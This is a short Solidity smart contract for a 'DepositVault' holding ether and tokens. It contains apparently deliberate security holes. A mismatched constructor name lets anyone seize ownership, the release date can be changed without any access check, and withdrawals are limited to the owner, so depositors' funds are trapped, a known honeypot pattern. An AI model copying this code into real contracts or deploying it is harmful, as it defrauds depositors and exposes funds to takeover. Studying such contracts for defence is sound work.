1 pragma solidity ^0.4.18;
2 
3 contract ERC20 {
4     function balanceOf(address who) constant public returns (uint256);
5     function transfer(address to, uint256 amount) public;
6 }
7 
8 contract DepositVault {
9     
10     event Deposit(address indexed depositor, uint amount);
11     event Withdrawal(address indexed to, uint amount);
12     event TransferOwnership(address indexed from, address indexed to);
13     
14     address Owner;
15     function transferOwnership(address to) onlyOwner { TransferOwnership(Owner, to); Owner = to; }
16     
17     mapping (address => uint) public Deposits;
18     uint minDeposit;
19     bool Locked = false;
20     uint Date;
21 
22     function Vault() open payable {
23         Owner = msg.sender;
24         minDeposit = 0.25 ether;
25         deposit();
26     }
27 
28     function SetReleaseDate(uint NewDate) {
29         Date = NewDate;
30     }
31 
32     function() public payable { deposit(); }
33 
34     function deposit() public payable {
35         if (msg.value > 0) {
36             if (msg.value >= MinimumDeposit()) Deposits[msg.sender] += msg.value;
37             Deposit(msg.sender, msg.value);
38         }
39     }
40 
41     function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
42     
43     function withdrawTo(address to, uint amount) public onlyOwner {
44         if (WithdrawalEnabled()) {
45             uint max = Deposits[msg.sender];
46             if (max > 0 && amount <= max) {
47                 Withdrawal(to, amount);
48                 to.transfer(amount);
49             }
50         }
51     }
52 
53     function withdrawToken(address token, uint amount) public payable onlyOwner {
54         uint bal = ERC20(token).balanceOf(address(this));
55         if (bal >= amount && Deposits[msg.sender] > 0) {
56             ERC20(token).transfer(msg.sender, amount);
57         }
58     }
59 
60     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
61     function ReleaseDate() public constant returns (uint) { return Date; }
62     function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
63     function lock() public { Locked = true; }
64     modifier onlyOwner { if (msg.sender == Owner) _; }
65     modifier open { if (!Locked) _; }
66 }